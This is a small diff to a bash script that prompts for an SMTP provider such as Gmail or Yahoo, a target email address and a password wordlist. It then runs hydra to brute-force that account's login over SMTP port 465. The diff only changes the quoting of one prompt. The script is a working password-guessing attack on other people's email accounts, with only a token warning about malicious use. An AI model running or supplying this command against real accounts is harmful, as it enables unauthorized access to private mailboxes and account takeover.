@@ -9,7 +9,7 @@ echo -e "Choose a SMTP service: \e[93mGmail \e[0m = smtp.gmail.com / \e[32mYahoo
 read -r smtp
 echo Enter Email Address:
 read -r email
-echo Provide Directory of Wordlist for Passwords:
+echo "Provide Directory of Wordlist for Passwords:"
 read -r wordlist
 echo Do not use this script with malicious intentions, remember that nothing on the web is completely untraceable.
 hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp
